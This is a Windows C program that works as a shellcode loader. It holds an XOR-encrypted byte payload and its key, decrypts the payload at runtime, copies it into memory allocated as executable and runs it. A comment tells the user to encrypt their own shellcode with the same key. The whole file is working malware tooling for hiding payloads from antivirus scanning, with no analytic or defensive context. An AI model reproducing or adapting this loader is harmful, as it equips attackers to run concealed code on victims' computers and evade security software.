#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// Function to XOR encrypt/decrypt data
void xorEncryptDecrypt(unsigned char* data, size_t dataSize, const unsigned char* key, size_t keySize) {
    for (size_t i = 0; i < dataSize; ++i) {
        data[i] ^= key[i % keySize];
    }
}

int main() {

    // Ensure your shellcode is encrypted with the same key before using it here
    unsigned char shellcode[] = "\x88\x20\xea\x97\x99\x9b\xa1\x74\x65\x73\x35\x25\x29\x39\x21\x38\x25\x29\x45\xb7\x16\x3c\xff\x3a\x09\x3b\xe2\x21\x79\x3c\xee\x21\x54\x3c\xe3\x1b\x23\x21\x7c\xd6\x3e\x2f\x3e\x45\xbd\x20\x58\xb3\xc5\x4f\x00\x08\x67\x5f\x54\x35\xa9\xa0\x7e\x28\x72\xa0\x96\x88\x21\x35\x25\x20\xe2\x21\x49\xf8\x23\x48\x2d\x72\xa4\xff\xe8\xe1\x73\x69\x73\x29\xf1\xa5\x07\x13\x3c\x69\xb9\x23\xe2\x3b\x79\x30\xee\x33\x54\x3d\x69\xb9\x90\x3f\x3b\x9e\xbd\x24\xf8\x40\xfc\x20\x68\xa5\x24\x42\xa8\x3c\x54\xb3\xd8\x35\xa9\xa0\x7e\x28\x72\xa0\x4c\x85\x06\x85\x38\x6b\x25\x57\x61\x36\x58\xa5\x10\xab\x2c\x30\xe3\x29\x57\x20\x72\xb1\x12\x24\xf8\x78\x3c\x2c\xe2\x33\x75\x3a\x60\xa4\x24\xf8\x70\xfc\x20\x68\xa3\x28\x2b\x20\x2c\x3b\x2a\x2e\x35\x30\x28\x2a\x28\x29\x29\xf7\x89\x53\x35\x26\x97\x89\x2b\x28\x2a\x3b\x3c\xee\x61\x9d\x23\x97\x96\x8c\x34\x3b\xdb\x75\x65\x73\x74\x74\x68\x69\x73\x21\xfe\xec\x75\x64\x73\x74\x35\xd2\x58\xf8\x06\xf4\x9e\xa1\xde\x83\xc1\xd6\x3e\x28\xc9\xcf\xe6\xdc\xe9\x9a\xa6\x3c\xf7\xac\x41\x4f\x6f\x0f\x6b\xf4\x9e\x93\x01\x71\xd3\x2e\x60\x1b\x1c\x0b\x74\x3c\x32\xfd\xae\x97\xbc\x10\x08\x1f\x02\x5a\x00\x0b\x11\x74";
    size_t shellcodeSize = sizeof(shellcode) - 1; // Subtract 1 to ignore the null terminator

    // Key for decryption
    const unsigned char key[] = "Mag1cAll3y";
    size_t keySize = strlen((const char*)key);

    // Decrypt the shellcode
    xorEncryptDecrypt(shellcode, shellcodeSize, key, keySize);

    // Allocate executable memory
    void* execMem = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (execMem == NULL) {
        fprintf(stderr, "VirtualAlloc failed\n");
        return -1;
    }

    // Copy the decrypted shellcode into the allocated memory
    memcpy(execMem, shellcode, shellcodeSize);

    // Cast the allocated memory to a function pointer and execute it
    ((void(*)())execMem)();

    // Free the allocated memory after execution
    VirtualFree(execMem, 0, MEM_RELEASE);

    return 0;
}
